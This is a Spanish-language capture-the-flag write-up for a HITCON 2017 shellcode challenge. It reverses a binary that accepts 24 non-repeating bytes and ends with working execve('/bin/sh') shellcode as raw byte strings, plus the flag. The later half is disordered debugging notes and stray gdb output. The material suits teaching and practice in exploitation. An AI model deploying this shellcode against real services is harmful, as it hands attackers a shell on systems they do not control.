
## **Enunciado**

Te daban el binario de 64 bits de un servicio corriendo en una máquina remota para que le pases un shellcode y puedes explotarlo para conseguir una shell y poder leer la flag.

## **Solución**

Hay que pasarle un shellcode como mucho de 24 bytes donde no se puede repetir ningún byte. No vale pasar el filtro de superar esos 24 bytecode que sean diferentes y luego poner detrás tu shellcode clásico de msfvenom. 

Joder, lo iba a explicar en plan sencillito para enterarme y ver lo que he aprendido y un tipo mucho más listo se me ha adelantado:

https://vasco-jofra.github.io/hitcon2017/EasyToSay/

Al lío... 

# **Revering**

Mirando el binario, lo primero que te llama la atención es la llamada al memcpy:
```asm
mov     rcx, cs:src
mov     rax, cs:dest
mov     edx, 34h        ; n
mov     rsi, rcx        ; src
mov     rdi, rax        ; dest
call    memcpy
```
Es en la instrucción "call memcpy" nos va a copiar "algo" hardcodeado a otra posición de memoria. Este "algo" es un código que se ejecuta previamente a nuestro shellcode que lel pasemos. del main donde va a guardar esa parte más lo que nosotros le pasemos.

Breakpoint 3 at 0x555555554d89
 
Así llama a la función memcpy:
Guessed arguments:
arg[0]: 0x7ffff7ff3000 --> 0x0 
arg[1]: 0x555555554ee8 --> 0x3148c03148ed3148 
arg[2]: 0x34 ('4')
	
Vamos a tener 0x34h(52) bytes que va a copiar desde la posición de memoria 0x555555554ee8 a la posición de memoria 0x7ffff7ff3000. O sea, siempre se va a copiar a la posición 0x7ffff7ff3000 el contenido de 0x555555554ee8. ¿Qué es lo que hay en esa posición de memoria? Echemos un vistazo:

```
   0x555555554ee8:	xor    rbp,rbp
   0x555555554eeb:	xor    rax,rax
   0x555555554eee:	xor    rbx,rbx
   0x555555554ef1:	xor    rcx,rcx
   0x555555554ef4:	xor    rdx,rdx
   0x555555554ef7:	xor    rdi,rdi
   0x555555554efa:	xor    rsi,rsi
   0x555555554efd:	xor    r8,r8
   0x555555554f00:	xor    r9,r9
   0x555555554f03:	xor    r10,r10
   0x555555554f06:	xor    r11,r11
   0x555555554f09:	xor    r12,r12
   0x555555554f0c:	xor    r13,r13
   0x555555554f0f:	xor    r14,r14
   0x555555554f12:	xor    r15,r15
   0x555555554f15:	add    rsp,0x1000
   0x555555554f1c:	add    BYTE PTR [rcx+rbp*2+0x6d],dl <-- Esta línea ya no forma parte de su código
```
Como vemos son 0x34 (bytes) si restamos las posiciones de memoria:
```
   0x555555554f1c-0x555555554ee8=0x34 (el número de bytes que copia en hexadecimal)
```
Entonces tenemos un código que nos va a limpiar todos los registros y va a reservar 0x1000 bytes en la pila, esto importante para luego preparar nuestro shellcode.

Si seguimos con la función main te va a pedir que introduzcas tu shellcode o código:

```asm
lea     rdi, format     ; "Give me your code :"
mov     eax, 0
```

Si seguimos más adelante llama a una función para comprobar ese código que le hemos pasado:

```asm
mov     [rbp+var_2040], rax
mov     rdx, [rbp+var_2040]
lea     rax, [rbp+var_2030]
mov     rsi, rdx
mov     rdi, rax
call    sub_C38
test    eax, eax
jz      short loc_E3F
```

Si miramos en la función 'sub_C38':

```asm
cmp     [rbp+var_40], 18h  <--- Comprueba que el código pasado no supere los 24 bytes
jbe     short loc_C74
```

Luego mediante dos bucles anidadados va comprobando que cada byte de los 24 sea diferente, devuelve 0 si hay alguno igual y 1 si todos son diferentes:

```
signed __int64 __fastcall sub_C38(char *a1, unsigned __int64 a2)
{
  signed __int64 result; // rax@7
  __int64 v3; // rcx@13
  signed int i; // [sp+18h] [bp-28h]@4
  signed int j; // [sp+1Ch] [bp-24h]@5
  char s[24]; // [sp+20h] [bp-20h]@4
  __int64 v7; // [sp+38h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  if ( a2 > 0x18 )
  {
    puts("Overflow");
    exit(-4);
  }
  memset(s, 0, 0x18uLL);
  s[0] = *a1;
  for ( i = 1; i < a2; ++i )
  {
    for ( j = 0; j < i; ++j )
    {
      if ( a1[i] == s[j] )
      {
        result = 0LL;
        goto LABEL_13;
      }
    }
    s[i] = a1[i];
  }
  result = 1LL;
LABEL_13:
  v3 = *MK_FP(__FS__, 40LL) ^ v7;
  return result;
}
```

De vuelta a la función main dependiendo del resultado sigue ejecutándose o se sale:

```asm
call    sub_C38
test    eax, eax
jz      short loc_E3F
```
Si es 0:
```asm
lea     rdi, aInvalidInput
call    puts
mov     edi, 0FFFFFFFDh ; status
call    _exit
```

Si es 1, sigue la ejecucción, y lo que hace es añadir nuestro shellcode detrás del shellcode que ya existe hardcodeado:

```asm
mov     rax, cs:dest
add     rax, 34h
mov     rdx, [rbp+var_2030]
mov     [rax], rdx
mov     rdx, [rbp+var_2028]
mov     [rax+8], rdx
mov     rdx, [rbp+var_2020]
mov     [rax+10h], rdx
lea     rdi, aRun       ; "Run !"
call    puts
mov     rdx, [rbp+var_2038]
mov     eax, 0
call    rdx
nop
mov     rax, [rbp+var_8]
xor     rax, fs:28h
jz      short locret_E5A
```

Entonces terminando con el reversing, tendríamos su código y el nuestro seguidos. Ahora hay que pensar que shellcode de 24 bytes le pasamos que no sea ningún byte igual y que nos permita ejecutar una shell para leer la flag.

# **Exploiting**

Aquí básicamente va a ser un copia y pega de la solución del enlace.

Para lograr ejecutar un /bin/sh, haciendo una llamada a la función execve hay que tener los siguientes valores en estos registros:
```
| %rax          | system call | %rdi                | %rsi                    | %rdx                    |
| ------------- |-------------|---------------------|-------------------------|-------------------------|
|59	        |sys_execve   |const char *filename | const char *const argv[]|	const char *const envp[]|		

```
En ensamblador quedaría así:


```asm
68 2f 73 68 00      push   0x0068732f   ; 1. '/sh\x00'
68 2f 62 69 6e      push   0x6e69622f   ; 1. '/bin'
48 89 e7            mov    rdi, rsp      ; 2. Put the '/bin//sh' addr in rdi
b0 3b               mov    al, 0x3b      ; 5. Mov to rax the execve syscall number
0f 05               syscall             ; 5. call it
```

Vale la pena detenerse en la
cat otro.asm 
;BITS64
global _start

section .text

_start:

xor	edx, edx
mov	rbx, 0x68732f6e69622fff
shr	rbx,0x8
push	rbx
mov	rdi,rsp
xor	rax,rax
push	rax
push	rdi
mov	rsi,rsp
mov	al,0x3b	
syscall

push	0x1
pop	rdi
push	0x3c
pop	rax
syscall


python -c "print '\x66\x41\x81\xc1\x85\x82\xb2\x64\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'" > file


\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58


2600


0x50da450ae000





gdb-peda$ i b
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x0000555555554de4 
	breakpoint already hit 1 time
2       breakpoint     keep y   0x0000555555554e2b 
	breakpoint already hit 1 time


	
	
	
	xor    eax,eax
   0x55cf92904245:	cmp    QWORD PTR [rip+0x20402b],0x0        # 0x55cf92b08278
   0x55cf9290424d:	je     0x55cf9290443f
=> 0x55cf92904253:	call   0x55cf92904e70
   0x55cf92904258:	lea    r14,[rax+0x1]
   0x55cf9290425c:	mov    BYTE PTR [rax],0x0
   0x55cf9290425f:	xor    eax,eax
   0x55cf92904261:	mov    rdi,r14

   
   
   0x55f5ecca7eb9:	xor    edx,edx
   0x55f5ecca7ebb:	xor    eax,eax
=> 0x55f5ecca7ebd:	call   0x55f5ecca67b0 <execl@plt>
   0x55f5ecca7ec2:	mov    rsi,QWORD PTR [rip+0x2033af]        # 0x55f5eceab278
   0x55f5ecca7ec9:	lea    rdi,[rip+0x16fe]        # 0x55f5ecca95ce
   
   
   
   
   
   x/64i 0x1415d46b000
   0x1415d46b000:	xor    rbp,rbp
   0x1415d46b003:	xor    rax,rax
   0x1415d46b006:	xor    rbx,rbx
   0x1415d46b009:	xor    rcx,rcx
   0x1415d46b00c:	xor    rdx,rdx
   0x1415d46b00f:	xor    rdi,rdi
   0x1415d46b012:	xor    rsi,rsi
   0x1415d46b015:	xor    r8,r8
   0x1415d46b018:	xor    r9,r9
   0x1415d46b01b:	xor    r10,r10
   0x1415d46b01e:	xor    r11,r11
   0x1415d46b021:	xor    r12,r12
   0x1415d46b024:	xor    r13,r13
   0x1415d46b027:	xor    r14,r14
   0x1415d46b02a:	xor    r15,r15
   0x1415d46b02d:	add    rsp,0x1000
   0x1415d46b034:	movabs rdi,0x68732f6e69622e
   0x1415d46b03e:	xor    di,0x1
   0x1415d46b042:	push   rdi
   0x1415d46b043:	push   rsp
   0x1415d46b044:	pop    rdi
   0x1415d46b045:	mov    al,0x3b
   0x1415d46b047:	syscall 
   0x1415d46b049:	or     al,BYTE PTR [rax]
   0x1415d46b04b:	add    BYTE PTR [rax],al
   0x1415d46b04d:	add    BYTE PTR [rax],al

   
   x/64i 0x7ffff7ff3000
   0x7ffff7ff3000:	xor    rbp,rbp
   0x7ffff7ff3003:	xor    rax,rax
   0x7ffff7ff3006:	xor    rbx,rbx
   0x7ffff7ff3009:	xor    rcx,rcx
   0x7ffff7ff300c:	xor    rdx,rdx
   0x7ffff7ff300f:	xor    rdi,rdi
   0x7ffff7ff3012:	xor    rsi,rsi
   0x7ffff7ff3015:	xor    r8,r8
   0x7ffff7ff3018:	xor    r9,r9
   0x7ffff7ff301b:	xor    r10,r10
   0x7ffff7ff301e:	xor    r11,r11
   0x7ffff7ff3021:	xor    r12,r12
   0x7ffff7ff3024:	xor    r13,r13
   0x7ffff7ff3027:	xor    r14,r14
   0x7ffff7ff302a:	xor    r15,r15
   0x7ffff7ff302d:	add    rsp,0x1000
   0x7ffff7ff3034:	mov    dx,0x1000
   0x7ffff7ff3038:	sub    rsp,rdx
   0x7ffff7ff303b:	add    r9,0x46424344
   0x7ffff7ff3042:	shl    ah,0x2
   0x7ffff7ff3045:	not    r13d
   0x7ffff7ff3048:	mov    dl,0x64
   0x7ffff7ff304a:	nop
   0x7ffff7ff304b:	xor    DWORD PTR [rax],eax
   0x7ffff7ff304d:	add    BYTE PTR [rax],al
   0x7ffff7ff304f:	add    BYTE PTR [rax],al


   52 los usa él y 23 te los deja de regalo
   
   
   
   x/32i 0x7ffff7ff3000
   0x7ffff7ff3000:	xor    rbp,rbp
   0x7ffff7ff3003:	xor    rax,rax
   0x7ffff7ff3006:	xor    rbx,rbx
   0x7ffff7ff3009:	xor    rcx,rcx
   0x7ffff7ff300c:	xor    rdx,rdx
   0x7ffff7ff300f:	xor    rdi,rdi
   0x7ffff7ff3012:	xor    rsi,rsi
   0x7ffff7ff3015:	xor    r8,r8
   0x7ffff7ff3018:	xor    r9,r9
   0x7ffff7ff301b:	xor    r10,r10
   0x7ffff7ff301e:	xor    r11,r11
   0x7ffff7ff3021:	xor    r12,r12
   0x7ffff7ff3024:	xor    r13,r13
   0x7ffff7ff3027:	xor    r14,r14
   0x7ffff7ff302a:	xor    r15,r15
   0x7ffff7ff302d:	add    rsp,0x1000
   0x7ffff7ff3034:	add    r9w,0x8285
   0x7ffff7ff303a:	mov    dl,0x64
   0x7ffff7ff303c:	lea    rsi,[rip+0xfffffffffffefaf6]        # 0x7ffff7fe2b39
   0x7ffff7ff3043:	add    rsi,r9
   0x7ffff7ff3046:	xor    eax,eax
   0x7ffff7ff3048:	syscall 
   0x7ffff7ff304a:	jmp    0x7ffff7ff3043
   0x7ffff7ff304c:	add    BYTE PTR [rax],al

   
   
   
   0x55555575605c:
   
   Cosas importantes sobre el código que ya tiene guardado él para ejecutar antes de nuestro shellcode:
   
  1.- Es en la instrucción "call memcpy" del main donde va a guardar esa parte más lo que nosotros le pasemos.
   Breakpoint 3 at 0x555555554d89
   
   Así llama a la función memcpy:
   Guessed arguments:
	arg[0]: 0x7ffff7ff3000 --> 0x0 
	arg[1]: 0x555555554ee8 --> 0x3148c03148ed3148 
	arg[2]: 0x34 ('4')
	
	Sabe donde está el código suyo (0x34h) bytes que guarda en esa posición de memoria(0x555555554ee8) porque lo calcula a partir del rip, son posiciones relativas pero el offset es fijo. 
	Echemos un vistazo:
	
		0x555555554d62:	mov    rax,QWORD PTR [rip+0x2012d7]        # 0x555555756040
		0x555555554d69:	mov    QWORD PTR [rbp-0x2038],rax
		0x555555554d70:	mov    rcx,QWORD PTR [rip+0x201299]        # 0x555555756010
		0x555555554d77:	mov    rax,QWORD PTR [rip+0x2012c2]        # 0x555555756040
		0x555555554d7e:	mov    edx,0x34

	
	En esos valores hay:
	
		x/32xw 0x555555756010
		0x555555756010:	0x55554ee8	0x00005555	0x00000000	0x00000000
		0x555555756020 <stdout>:	0xf7dd4600	0x00007fff	0x00000000	0x00000000
		0x555555756030 <stdin>:	0xf7dd38c0	0x00007fff	0x00000000	0x00000000
		0x555555756040:	0xf7ff3000	0x00007fff	0x00000000	0x00000000
		
	O sea, siempre se va a copiar a la posición 0x7ffff7ff3000 el contenido de 0x555555554ee8
	Su código va a estar hardcodeado en la posición 0x555555554ee8:
	
	   0x555555554ee8:	xor    rbp,rbp
	   0x555555554eeb:	xor    rax,rax
	   0x555555554eee:	xor    rbx,rbx
	   0x555555554ef1:	xor    rcx,rcx
	   0x555555554ef4:	xor    rdx,rdx
	   0x555555554ef7:	xor    rdi,rdi
	   0x555555554efa:	xor    rsi,rsi
	   0x555555554efd:	xor    r8,r8
	   0x555555554f00:	xor    r9,r9
	   0x555555554f03:	xor    r10,r10
	   0x555555554f06:	xor    r11,r11
	   0x555555554f09:	xor    r12,r12
	   0x555555554f0c:	xor    r13,r13
	   0x555555554f0f:	xor    r14,r14
	   0x555555554f12:	xor    r15,r15
	   0x555555554f15:	add    rsp,0x1000
	   0x555555554f1c:	add    BYTE PTR [rcx+rbp*2+0x6d],dl <-- Esta línea ya no forma parte de su código
	   
	   0x555555554f1c-0x555555554ee8=0x34 (el número de bytes que copia en hexadecimal)
  
  2.- Despues del __read_check, tenemos estos valores:
  
		   0x555555554dbd:	call   0x555555554918
		=> 0x555555554dc2:	cdqe   
		   0x555555554dc4:	mov    QWORD PTR [rbp-0x2040],rax
		   0x555555554dcb:	mov    rdx,QWORD PTR [rbp-0x2040]
		   0x555555554dd2:	lea    rax,[rbp-0x2030]
		   0x555555554dd9:	mov    rsi,rdx
		[------------------------------------stack-------------------------------------]
		0000| 0x7fffffffc260 --> 0x0 
		0008| 0x7fffffffc268 --> 0x7ffff7ff3000 --> 0x3148c03148ed3148 
		0016| 0x7fffffffc270 --> 0x64b28285c1814166 
		0024| 0x7fffffffc278 --> 0x4cfffefaf6358d48 
		0032| 0x7fffffffc280 --> 0xf7eb050fc031ce01 
		0040| 0x7fffffffc288 --> 0x0 
		0048| 0x7fffffffc290 --> 0x0 
		0056| 0x7fffffffc298 --> 0x0 

	Si nos fijamos bien son las líneas de nuestro código, exactamente 0x18 bytes. 
	
	   x/32i 0x7fffffffc270
	   0x7fffffffc270:	add    r9w,0x8285
	   0x7fffffffc276:	mov    dl,0x64
	   0x7fffffffc278:	lea    rsi,[rip+0xfffffffffffefaf6]        # 0x7ffffffebd75
	   0x7fffffffc27f:	add    rsi,r9
	   0x7fffffffc282:	xor    eax,eax
	   0x7fffffffc284:	syscall 
	   0x7fffffffc286:	jmp    0x7fffffffc27f
	   0x7fffffffc288:	add    BYTE PTR [rax],al

  3.- A partir de aquí empieza a empalmar su código con el que tu has introducido:
  
	   0x555555554de8:	mov    rax,QWORD PTR [rip+0x201251]        # 0x7ffff7ff3000
	   0x555555554def:	add    rax,0x34
	=> 0x555555554df3:	mov    rdx,QWORD PTR [rbp-0x2030]	<- Va metiendo los trozos de nuestro código que están en la pila
	   0x555555554dfa:	mov    QWORD PTR [rax],rdx
	   0x555555554dfd:	mov    rdx,QWORD PTR [rbp-0x2028]
	   0x555555554e04:	mov    QWORD PTR [rax+0x8],rdx
	   0x555555554e08:	mov    rdx,QWORD PTR [rbp-0x2020]

   
 
 En definitiva sólo admite 23 bytes y que no se repitan para explotar el servicio.
 
 Mira este shellcode justo 23 bytes:
 
 \x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05




hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
